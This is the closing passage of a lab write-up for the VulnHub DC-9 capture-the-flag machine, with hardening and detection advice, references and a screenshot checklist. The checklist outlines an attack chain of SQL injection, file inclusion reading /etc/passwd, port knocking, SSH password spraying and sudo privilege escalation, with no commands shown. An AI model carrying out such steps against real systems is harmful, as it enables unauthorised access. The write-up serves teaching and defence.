  be salted+hashed; a database dump should not be a credential dump.
- **Validate file paths.** The LFI exists because `include` trusts `$_GET`.
  Use an allow-list of permitted filenames, never raw user input.
- **Port knocking is not authorisation.** It hides SSH but the secret lived in
  a world-readable config; combine it with keys/2FA, not as the sole control.
- **Least privilege for operators.** A user running an arbitrary copy binary as
  root is a root shell waiting to happen. Constrain `sudoers` to exact,
  safe commands.
- **Harden `/etc/passwd`.** Any process that can append to it can add UID-0
  users; restrict write access and monitor file-integrity.
- **Detect it:** alert on SSH sprays (many failures), on sudo invoking custom
  binaries, and on new UID-0 entries in `/etc/passwd`.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/dc-9,412/>
- Community writeups consulted:
  - [Fahmi FJ — VulnHub DC-9](https://fahmifj.github.io/ctf/vulnhub/dc-9/)
  - [Hacking Articles — DC: 9 Vulnhub Walkthrough](https://www.hackingarticles.in/dc-9-vulnhub-walkthrough/)
  - [benkyou — Vulnhub DC-9](https://benkyousec.github.io/posts/vulnhub-dc9/)
  - [d3vyce — Writeup DC-9](https://blog.d3vyce.fr/writeup-ctf/writeup-dc-9-vulnhub/)
- Tool docs:
  - [knockd / port knocking overview](https://en.wikipedia.org/wiki/Port_knocking)
  - [sqlmap documentation](https://sqlmap.org/)
  - [ffuf](https://github.com/ffuf/ffuf)
  - [Hydra](https://github.com/vanhauser-thc/thc-hydra)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with arp-scan
- [ ] `images/02-nmap.png` — port 80 open, port 22 filtered
- [ ] `images/03-enum.png` — the `search.php` SQL injection / sqlmap dump
- [ ] `images/04-lfi.png` — reading `/etc/passwd` via `manage.php?file=`
- [ ] `images/05-knock.png` — `/etc/knockd.conf` and the knock sequence
- [ ] `images/06-spray.png` — hydra finding SSH credentials
- [ ] `images/07-privesc.png` — `sudo -l` showing the `test` binary
- [ ] `images/08-root-flag.png` — the root flag

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
